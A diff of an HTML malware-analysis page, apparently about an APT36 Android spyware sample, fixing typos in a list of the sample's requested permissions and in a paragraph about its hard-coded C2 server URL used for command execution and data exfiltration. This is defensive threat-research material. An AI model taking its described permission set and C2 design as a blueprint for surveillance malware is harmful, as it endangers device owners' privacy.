@@ -187,9 +187,9 @@ ___________________________________________________________________</pre>
     <p>The above defnies the following Android device permission constants (android.permission.*):</p>
     
        <pre class="hack dark"><code>
-.ACCESS_NETWORK_STATE                [ACCESS NETWORK INFORMATION, Wi-Fi, GSM, GPRS, UMTS ETC]
+.ACCESS_NETWORK_STATE                // ACCESS NETWORK INFORMATION, Wi-Fi, GSM, GPRS, UMTS ETC]
 .WRITE_EXTERNAL_STORAGE              [WRITE TO DEVICE EXTERNAL STORAGE] 
-.ACCESS_WIFI_STATE.                  [ACCESS WIFI NETWORK INFORMATION]
+.ACCESS_WIFI_STATE                   [ACCESS WIFI NETWORK INFORMATION]
 .ACCESS_COARSE_LOCATION              [ACCESS APPROXIMATE LOCATION]
 .RECEIVE_BOOT_COMPLETED              [RECEIVE THE `ACTION_BOOT_COMPLETED` INTENT] 
 .CHANGE_WIFI_MULTICAST_STATE         [WIFI MULTICAST MODE]
@@ -201,11 +201,11 @@ ___________________________________________________________________</pre>
 .READ_PHONE_STATE                    [READ ACCESS TO CELLULAR NETWORK INFO, STATUS OF ONGOING CALLS ETC] 
 .PROCESS_OUTGOING_CALLS              [IDENTIFY NUMBER DURING OUTBOUND CALL, REDIRECT OR ABORT THE CALL] 
 .RECORD_AUDIO                        [ACCESS DEVICE MICROPHONE TO RECORD AUDIO]
-.CAMERA                              [ACCESS TO THE DEVICE'S CAMERA
+.CAMERA                              [ACCESS TO THE DEVICE CAMERA]
 .CALL_PHONE                          [INITIATE PHONE CALL WITHOUT UI DIALER OR CONFIRMATION FROM OWNER]  
 .READ_CONTACTS                       [INTERACT W/ CONTACTSCONTRACT API TO READ DEVICE CONTACTS]
 .VIBRATE                             [ACCESS TO THE DEVICE DC MOTOR THAT CREATES VIBRATION]
-.READ_CALL_LOG                       [READ DEVICE OWNER'S CALL LOG]
+.READ_CALL_LOG                       [READ DEVICE CALL LOG]
 .CLEAR_APP_CACHE                     [CLEAR CACHE OF ALL INSTALLED APKs]
 </code>
 </pre>
@@ -888,7 +888,7 @@ public class com.example.redacted.redacted.CallMonitor$HttpAsyncTask extends and
 }
 </code>
 </pre>
-         <p>The above contains <pre><code>`v14_2.<init>(com.example.appcode.appcode.setting.weburl);`</pre></code>, a callback to the `setting` class where webUrl, a parameter assigned with a hard-coded value, is defined. This value is the malware sample's remote C2 server, of which, is used to transmit dynamic commands from APT36 to the compromised device (command execution), as well as, exfiltrate device data over an outbound HTTP socket:</p>
+         <p>The above contains `v14_2.<init>(com.example.appcode.appcode.setting.weburl);`, a callback to the `setting` class where webUrl, a parameter assigned with a hard-coded value, is defined. This value is the malware sample's remote C2 server, of which, is used to transmit dynamic commands from APT36 to the compromised device (command execution), as well as, exfiltrate device data over an outbound HTTP socket:</p>
      
      <pre class="hack dark"><code>
 static {
